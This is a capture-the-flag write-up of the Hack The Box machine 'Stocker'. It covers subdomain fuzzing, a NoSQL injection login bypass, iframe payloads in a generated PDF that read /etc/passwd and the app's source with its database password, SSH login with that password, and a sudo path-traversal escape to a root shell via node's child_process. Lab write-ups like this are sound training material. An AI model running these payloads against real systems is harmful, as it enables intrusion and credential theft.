# Stocker - HTB(Easy)
## Itay Nafrin | January 21st, 2023
### IP = 10.10.11.196

### NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Subdomain
`$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://stocker.htb' -H "Host: FUZZ.stocker.htb" --hw 93`

```
Target: http://stocker.htb/                               
Total requests: 114441                                                                                                             
==================================================================                                                                 
ID    Response   Lines      Word         Chars          Request                                                                    
==================================================================                                                                 
00019:  C=302      0 L         4 W           28 Ch        "dev"
                                
Total time: 0             
Processed Requests: 114441                                       
Filtered Requests: 114440                                        
Requests/sec.: 0

```

### Enumeration 

After discovering the 'dev' subdomain we enter it to our /etc/hosts after that I entered it in the url and it directed me to a login form after playing with it a little bit trying some default creds, sqli, etc; I checked my wappalyezer extension that said that the web app runs on express meaning node js, so I thought to myself if it's using node it probably uses mongodb as the database manager, so I decided to do some nosql injection techniques. 

#### NoSql Injection

Well as you may know or not(if not read this interesting article about nosqli and how it works https://infosecwriteups.com/nosql-injection-8732c2140576) when injecting nosql you can do it in two ways one with the php adaption where you manipulate the post parameters, and the second is with the json technique where you change the content type to `application/json` and by that the web app will get json parameters. So how to do it:
<br/>
![nosqli](captures/nosqli.png)

### Keep Enumerating 

After entering the site you got a pretty straight forward site, you add an item to the cart and you purchase it, after purchasing you get a pdf certificate that you indeed purchased the item/s, this is the interesting part. When I see a pdf first thing that comes to mind is Server Side XSS so lets try.

<br/>

![pdfi](captures/pdfi.png)

Did the same thing with this payload: `<iframe height=750 width=500 src=file:///etc/passwd></iframe>`
got this:

<br/>

![etc-passwd](captures/etc-passwd.png)

<b>users: root, angoose.</b>

Now, to retrieve the password it was a little more difficult, if you know the linux file system you should know that web apps are located in the `/var/www` directory, now we know that there is a subdomain called 'dev' in the domain so maybe there is a directory that stores the dev subdomains data, we actually got a hint for this in the login part because if you enter this payload: `{"username": {"$gt": undefined}, "password": {"$gt": undefined}}` you get an error and over there you get errors from the directory: `/var/www/dev`. So after we know that we have a dev directory confirmed, now maybe there's a `index.js` because it's a common file in a web directory, so let's check it. Payload: `<iframe height=750 width=600 src=file:///var/www/dev/index.js></iframe>`. There is a file, and in that file a possible password because if you pay attention in the top of the file you can see what might be a password in the line: `const dbURI="mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";`
<br/>

### SSH Login

![ssh-login](captures/ssh.png)

### PrivEsc

Now after logging in and roaming a little bit in the system I want to escalate my privileges so first thing I do, `sudo -l` which displays me my sudo permissions.
<br/>

![sudo-l](captures/sudo.png)

<br/>

Now after seeing this we know we can execute javascript files from the folder `/usr/local/scripts` we can manipulate this by just navigating(by using ../) to which ever file we want after we write the prefix `/usr/local/scripts`. But we're not finished because we want a root shell how we get let's use the internet for that. Quick search for node in GTFObins and found the command `require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})`. Now lets implement this in our shell.

<br/>

![root](captures/root.png)
